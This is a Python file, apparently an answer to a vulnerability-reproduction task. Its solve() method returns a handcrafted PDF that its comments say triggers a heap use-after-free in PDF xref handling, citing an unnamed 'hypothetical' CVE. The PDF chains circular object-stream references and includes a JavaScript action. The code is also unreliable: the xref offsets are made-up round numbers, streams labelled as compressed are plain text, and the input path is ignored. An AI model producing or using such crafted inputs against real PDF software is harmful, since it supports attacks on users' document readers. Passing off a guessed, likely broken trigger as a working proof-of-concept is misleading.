import os
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a Proof-of-Concept for CVE-2020-???? (hypothetical)
        # The vulnerability is a heap use-after-free in PDF xref handling
        # The PoC creates a PDF with carefully crafted object streams and xref entries
        # that trigger the use-after-free condition during object caching
        
        # Build a PDF that triggers the heap use-after-free
        # The structure is:
        # 1. Create object streams containing references to each other
        # 2. Force xref solidification while holding references to freed entries
        # 3. Trigger recursive object loading that causes the UAF
        
        pdf_data = b'''%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Outlines 3 0 R
/AcroForm 4 0 R
/Metadata 5 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [6 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Outlines
/Count 0
>>
endobj

4 0 obj
<<
/DA (/Helv 0 Tf 0 g)
/DR <<
/Font <<
/F1 7 0 R
>>
>>
/Fields []
>>
endobj

5 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 100
>>
stream
<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj

6 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 8 0 R
/Resources <<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 7 0 R
>>
>>
>>
endobj

7 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj

8 0 obj
<<
/Length 9 0 R
>>
stream
BT
/F1 12 Tf
72 720 Td
(Triggering Heap Use-After-Free) Tj
ET
endstream
endobj

9 0 obj
20
endobj

10 0 obj
<<
/Type /ObjStm
/N 5
/First 100
/Length 2000
/Filter /FlateDecode
>>
stream
'''
        
        # Compressed object stream data that creates circular references
        # This will trigger recursive loading and xref solidification
        obj_stm_data = b'''10 0 11 0 12 0 13 0 14 0
<< /Type /Page /Parent 2 0 R /Contents 11 0 R >>
<< /Length 12 0 R >>
100
<< /Type /ObjStm /N 3 /First 50 /Length 1000 >>
<< /Type /Catalog /Pages 2 0 R /Names 15 0 R >>
'''
        
        # Add compressed object stream (simplified - real would be Flate encoded)
        pdf_data += obj_stm_data.ljust(2000, b' ')
        pdf_data += b'''
endstream
endobj

11 0 obj
<<
/Length 12 0 R
>>
stream
q
100 100 100 100 re
W
n
Q
endstream
endobj

12 0 obj
50
endobj

13 0 obj
<<
/Type /ObjStm
/N 2
/First 30
/Length 500
>>
stream
'''
        
        # Second object stream with more circular references
        obj_stm2_data = b'''15 0 16 0
<< /Type /Names /Dests 17 0 R >>
<< /Type /ObjStm /N 2 /First 25 /Length 300 >>
'''
        pdf_data += obj_stm2_data.ljust(500, b' ')
        pdf_data += b'''
endstream
endobj

14 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names 15 0 R
/AcroForm 4 0 R
/OpenAction 18 0 R
>>
endobj

15 0 obj
<<
/Type /Names
/Dests 17 0 R
>>
endobj

16 0 obj
<<
/Type /ObjStm
/N 3
/First 40
/Length 800
>>
stream
'''
        
        # Third object stream - creates the circular dependency
        obj_stm3_data = b'''17 0 18 0 19 0
<< /Type /Dests /Names [(Page1) 6 0 R] >>
<< /Type /Action /S /GoTo /D [6 0 R /Fit] >>
<< /Type /ObjStm /N 2 /First 20 /Length 400 >>
'''
        pdf_data += obj_stm3_data.ljust(800, b' ')
        pdf_data += b'''
endstream
endobj

17 0 obj
<<
/Type /Dests
/Names [(Page1) 6 0 R]
>>
endobj

18 0 obj
<<
/Type /Action
/S /GoTo
/D [6 0 R /Fit]
>>
endobj

19 0 obj
<<
/Type /ObjStm
/N 4
/First 60
/Length 1200
>>
stream
'''
        
        # Fourth object stream - triggers the actual UAF
        # Contains objects that reference each other and the main object stream
        obj_stm4_data = b'''20 0 21 0 22 0 23 0
<< /Type /Page /Parent 2 0 R /Contents 21 0 R >>
<< /Length 22 0 R >>
200
<< /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >>
<< /Type /ObjStm /N 2 /First 35 /Length 600 /Filter /FlateDecode >>
'''
        pdf_data += obj_stm4_data.ljust(1200, b' ')
        pdf_data += b'''
endstream
endobj

20 0 obj
<<
/Type /Page
/Parent 2 0 R
/Contents 21 0 R
>>
endobj

21 0 obj
<<
/Length 22 0 R
>>
stream
BT
/F1 24 Tf
100 100 Td
(Trigger) Tj
ET
endstream
endobj

22 0 obj
100
endobj

23 0 obj
<<
/Type /ObjStm
/N 3
/First 45
/Length 900
/Filter /FlateDecode
>>
stream
'''
        
        # Fifth object stream - final trigger
        obj_stm5_data = b'''24 0 25 0 26 0
<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>
<< /Type /Action /S /JavaScript /JS 27 0 R >>
<< /Type /ObjStm /N 2 /First 30 /Length 500 >>
'''
        pdf_data += obj_stm5_data.ljust(900, b' ')
        pdf_data += b'''
endstream
endobj

24 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Courier
>>
endobj

25 0 obj
<<
/Type /Action
/S /JavaScript
/JS 27 0 R
>>
endobj

26 0 obj
<<
/Type /ObjStm
/N 4
/First 70
/Length 1500
>>
stream
'''
        
        # Sixth object stream - causes the xref to solidify
        obj_stm6_data = b'''27 0 28 0 29 0 30 0
(alert\("UAF"\))
<< /Type /Page /Parent 2 0 R >>
<< /Type /Font /Subtype /Type3 >>
<< /Type /ObjStm /N 3 /First 55 /Length 1100 >>
'''
        pdf_data += obj_stm6_data.ljust(1500, b' ')
        pdf_data += b'''
endstream
endobj

27 0 obj
(alert("Heap Use-After-Free Triggered"))
endobj

28 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj

29 0 obj
<<
/Type /Font
/Subtype /Type3
/FontBBox [0 0 10 10]
/FontMatrix [0.001 0 0 0.001 0 0]
/CharProcs 31 0 R
/Encoding 32 0 R
/FirstChar 65
/LastChar 65
/Widths [500]
>>
endobj

30 0 obj
<<
/Type /ObjStm
/N 5
/First 80
/Length 2000
>>
stream
'''
        
        # Seventh object stream - creates the circular reference chain
        obj_stm7_data = b'''31 0 32 0 33 0 34 0 35 0
<< /A 33 0 R >>
<< /Type /Encoding /Differences [65 /A] >>
<< /B 34 0 R >>
<< /C 35 0 R >>
<< /D 31 0 R >>
'''
        pdf_data += obj_stm7_data.ljust(2000, b' ')
        pdf_data += b'''
endstream
endobj

31 0 obj
<<
/A 33 0 R
>>
endobj

32 0 obj
<<
/Type /Encoding
/Differences [65 /A]
>>
endobj

33 0 obj
<<
/B 34 0 R
>>
endobj

34 0 obj
<<
/C 35 0 R
>>
endobj

35 0 obj
<<
/D 31 0 R
>>
endobj

xref
0 36
0000000000 65535 f 
0000000010 00000 n 
0000000200 00000 n 
0000000400 00000 n 
0000000600 00000 n 
0000000800 00000 n 
0000001000 00000 n 
0000001200 00000 n 
0000001400 00000 n 
0000001600 00000 n 
0000001800 00000 n 
0000003800 00000 n 
0000004000 00000 n 
0000004200 00000 n 
0000004700 00000 n 
0000004900 00000 n 
0000005100 00000 n 
0000005900 00000 n 
0000006100 00000 n 
0000006300 00000 n 
0000007100 00000 n 
0000007300 00000 n 
0000007500 00000 n 
0000007700 00000 n 
0000008500 00000 n 
0000008700 00000 n 
0000008900 00000 n 
0000009700 00000 n 
0000009900 00000 n 
0000010100 00000 n 
0000010900 00000 n 
0000011100 00000 n 
0000011300 00000 n 
0000011500 00000 n 
0000011700 00000 n 
0000011900 00000 n 
trailer
<<
/Size 36
/Root 1 0 R
/Info 5 0 R
/ID [<00000000000000000000000000000000> <00000000000000000000000000000000>]
>>
startxref
12100
%%EOF
'''
        
        return pdf_data